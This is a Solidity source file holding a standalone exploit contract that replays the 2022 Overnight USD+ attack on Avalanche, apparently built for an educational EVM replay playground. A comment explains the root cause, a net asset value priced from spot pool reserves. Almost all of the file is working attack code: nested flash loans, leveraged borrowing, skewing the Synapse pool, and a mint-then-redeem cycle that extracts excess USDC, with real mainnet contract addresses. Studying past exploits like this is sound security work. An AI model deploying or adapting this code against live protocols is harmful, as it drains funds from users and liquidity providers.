// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-Overnight).
//
// The DeFiHackLabs PoC (test/Overnight_exp.sol) runs the whole attack INLINE in
// the Foundry test contract `ContractTest` (attacker = address(this); the Aave
// flash-loan callback `executeOperation` lives on the test). There is therefore
// no standalone contract to deploy, so we hand-author a self-contained copy.
//
// Logic + constants are copied verbatim from test/Overnight_exp.sol. The ONLY
// adaptation is splitting the original 6-iteration `Hack()` loop into separate
// entrypoints (see below). The playground's in-browser EVM replays the exploit
// against ONE fixed fork block, but Overnight's Exchange applies an
// `oncePerBlock` modifier to BOTH `buy()` and `redeem()`:
//
//   modifier oncePerBlock() {
//       if (!hasRole(FREE_RIDER_ROLE, msg.sender)) {
//           require(lastBlockNumber < block.number, "Only once in block");
//       }
//       lastBlockNumber = block.number;
//       _;
//   }
//
// The real attack advanced `block.number` between buy and redeem each iteration
// (`cheats.roll(block.number + 1)`). A single-block replay cannot, so we split
// the FIRST iteration into three top-level calls: `seed()` + `buyPhase()` run
// unrecorded in `setup` (the recorder then `storeSlot`s the Exchange's
// `lastBlockNumber` back to 0 to satisfy the gate), and `redeemPhase()` is the
// single recorded attack. This faithfully reproduces one NAV-inflation cycle's
// redeem extraction (the profitable half of the bug) with a full opcode trace,
// and `setup` performs the honest pool-skew + mint that inflates the NAV.
//
// Root cause: Overnight USD+ derived its mint/redeem exchange rate from the SPOT
// reserves of the Synapse nUSD stable-pool (read via netAssetValue() /
// totalNetAssets()). The attacker flash-loaned, one-sidedly added USDC.e to the
// pool, removed liquidity imbalanced 9x to skew D/virtual-price, then
// USDplus.buy() (which internally addLiquidity(USDC.e)) inflated
// totalNetAssets(); the subsequent redeem() paid out more USDC than was fairly
// backed. Spot-AMM-priced NAV is a flash-loan-manipulable oracle.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IJoeRouter {
    function swapAVAXForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface IUSDPlus {
    function buy(address _referredBy, uint256 amount) external returns (uint256);
    function redeem(address to, uint256 amount) external returns (uint256 redeemed);
}

interface ISwapFlashLoan {
    function calculateTokenAmount(uint256[] calldata amounts, bool deposit) external view returns (uint256);
    function addLiquidity(uint256[] calldata amounts, uint256 minToMint, uint256 deadline) external returns (uint256);
    function calculateRemoveLiquidity(uint256 amount) external returns (uint256[] memory);
    function removeLiquidityImbalance(uint256[] calldata amounts, uint256 maxBurnAmount, uint256 deadline)
        external returns (uint256);
    function swap(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBenqiFinance {
    function enterMarkets(address[] memory qiTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface IBenqiChainlinkOracle {
    function getUnderlyingPrice(address qiToken) external view returns (uint256);
}

interface IQiUSDCn {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IQiUSDC {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface IPlatypus {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface ISicleRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface INetAsset {
    function netAssetValue() external view returns (uint256);
    function totalNetAssets() external view returns (uint256);
}

contract OvernightDrain {
    IJoeRouter constant Router = IJoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    ISicleRouter constant sicleRouter = ISicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);
    IUSDPlus constant USDplus = IUSDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    ISwapFlashLoan constant Swap = ISwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan constant LendingPoolV2 = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);
    IAaveFlashloan constant PoolV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IBenqiFinance constant Benqi = IBenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);
    IBenqiChainlinkOracle constant Oracle = IBenqiChainlinkOracle(0x316aE55EC59e0bEb2121C0e41d4BDef8bF66b32B);
    IQiUSDCn constant qiUSDCn = IQiUSDCn(0xB715808a78F6041E46d61Cb123C9B4A27056AE9C);
    IPlatypus constant Platypus = IPlatypus(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    IQiUSDC constant qiUSDC = IQiUSDC(0xBEb5d47A3f720Ec0a390d04b4d41ED7d9688bC7F);
    INetAsset constant netAsset = INetAsset(0xc2c84ca763572c6aF596B703Df9232b4313AD4e3);
    INetAsset constant totalNetAsset = INetAsset(0x9Af655c4DBe940962F776b685d6700F538B90fcf);

    IERC20 constant USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);
    IERC20 constant WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 constant nUSD = IERC20(0xCFc37A6AB183dd4aED08C204D1c2773c0b1BDf46);
    IERC20 constant DAI_e = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 constant USDT_e = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 constant USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 constant nUSDLP = IERC20(0xCA87BF3ec55372D9540437d7a86a7750B42C02f4);

    address constant avUSDC = 0x46A51127C3ce23fb7AB1DE06226147F446e4a857;

    uint256 public PoolV2BorrowAmount;
    uint256 public mintAmount;

    // === phase 0: seed capital (36,000 USDC for 2,830 AVAX via Trader Joe) ===
    // Called from setup, unrecorded, with 2,830 AVAX of msg.value. Mirrors
    // testExploit()'s opening swap. The attacker EOA (setup caller) is funded
    // with AVAX via setup.fundAttackerWei before this.
    function seed() external payable {
        uint256 amountBuy = 36_000_000_000;
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(USDC);
        Router.swapAVAXForExactTokens{value: 2830 ether}(amountBuy, path, address(this), block.timestamp);
    }

    // === phase 1: the buy side of one NAV-inflation iteration ===
    // Outer Aave V2 flash-loan of all USDC.e in avUSDC; executeOperation does
    // the inner V3 flash-loan, Benqi leverage, Synapse skew, and USDplus.buy().
    // Called from setup, unrecorded. Sets Exchange.lastBlockNumber = block.number.
    function buyPhase() external {
        PoolV2BorrowAmount = USDC_e.balanceOf(avUSDC);
        address[] memory assets = new address[](1);
        assets[0] = address(USDC_e);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = PoolV2BorrowAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        LendingPoolV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // === phase 2 (RECORDED): redeem inflated USD+ for USDC, then dump residue ===
    // Exchange.lastBlockNumber has been reset to 0 by setup.storeSlot, so the
    // oncePerBlock gate passes. Redeem is bounded by the inflated
    // totalNetAssets() - netAssetValue() headroom, paying out more USDC than
    // was fairly contributed. Then swap leftover USD+ via SicleSwap.
    function redeemPhase() external {
        if ((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))) {
            USDplus.redeem(address(USDC), USDPLUS.balanceOf(address(this)));
        } else {
            USDplus.redeem(address(USDC), totalNetAsset.totalNetAssets() - netAsset.netAssetValue());
        }
        USDPLUS.approve(address(sicleRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDPLUS);
        path[1] = address(USDC);
        uint256 residual = USDPLUS.balanceOf(address(this));
        if (residual > 0) {
            sicleRouter.swapExactTokensForTokens(residual, 0, path, address(this), block.timestamp);
        }
    }

    // Aave V2/V3 flash-loan callback. Carries the iteration's buy-side logic.
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        if (msg.sender == address(LendingPoolV2)) {
            USDC_e.approve(address(LendingPoolV2), type(uint256).max);
            address[] memory assets1 = new address[](1);
            assets1[0] = address(USDC);
            uint256[] memory amounts1 = new uint256[](1);
            amounts1[0] = PoolV2BorrowAmount / 2;
            uint256[] memory modes = new uint256[](1);
            modes[0] = 0;
            PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), "", 0);
            return true;
        } else {
            USDC.approve(address(PoolV3), type(uint256).max);
            mintAmount = PoolV2BorrowAmount / 2;
            USDC.approve(address(qiUSDCn), type(uint256).max);
            qiUSDCn.mint(mintAmount);

            address[] memory qiTokens = new address[](1);
            qiTokens[0] = address(qiUSDCn);
            Benqi.enterMarkets(qiTokens);
            (, uint256 accountLiquidity,) = Benqi.getAccountLiquidity(address(this));
            uint256 oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;
            uint256 borrowAmount = accountLiquidity / oraclePrice;
            qiUSDC.borrow(borrowAmount);

            USDC_e.approve(address(Swap), type(uint256).max);
            nUSDLP.approve(address(Swap), type(uint256).max);
            uint256[] memory amount = new uint256[](4);
            amount[2] = USDC_e.balanceOf(address(this));
            uint256 minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;
            uint256 LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);
            uint256 i = 0;
            while (i < 9) {
                uint256[] memory removeAmount = new uint256[](4);
                removeAmount = Swap.calculateRemoveLiquidity(LPAmount);
                removeAmount[2] = 0;
                Swap.removeLiquidityImbalance(removeAmount, LPAmount, block.timestamp);
                LPAmount = nUSDLP.balanceOf(address(this));
                i++;
            }
            uint256[] memory removeAmount1 = new uint256[](4);
            removeAmount1 = Swap.calculateRemoveLiquidity(LPAmount);
            Swap.removeLiquidityImbalance(removeAmount1, LPAmount, block.timestamp);
            uint256 swapAmount = USDC_e.balanceOf(address(this)) / 3;
            nUSD.approve(address(Swap), type(uint256).max);
            DAI_e.approve(address(Swap), type(uint256).max);
            USDT_e.approve(address(Swap), type(uint256).max);
            Swap.swap(2, 0, swapAmount, 0, block.timestamp);
            Swap.swap(2, 1, swapAmount, 0, block.timestamp);
            Swap.swap(2, 3, swapAmount, 0, block.timestamp);

            USDC.approve(address(USDplus), type(uint256).max);
            USDplus.buy(address(USDC), USDC.balanceOf(address(this)));
            Swap.swap(0, 2, nUSD.balanceOf(address(this)), 0, block.timestamp);
            Swap.swap(1, 2, DAI_e.balanceOf(address(this)), 0, block.timestamp);
            Swap.swap(3, 2, USDT_e.balanceOf(address(this)), 0, block.timestamp);

            USDC_e.approve(address(qiUSDC), qiUSDC.borrowBalanceStored(address(this)));
            qiUSDC.repayBorrow(qiUSDC.borrowBalanceStored(address(this)));
            qiUSDCn.redeemUnderlying(mintAmount);

            USDC_e.approve(address(Platypus), type(uint256).max);
            uint256 USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10_000 + 1000;
            Platypus.swap(
                address(USDC_e),
                address(USDC),
                USDC_eSwapAmount,
                USDC_eSwapAmount * 99 / 100,
                address(this),
                block.timestamp
            );

            return true;
        }
    }

    receive() external payable {}
}
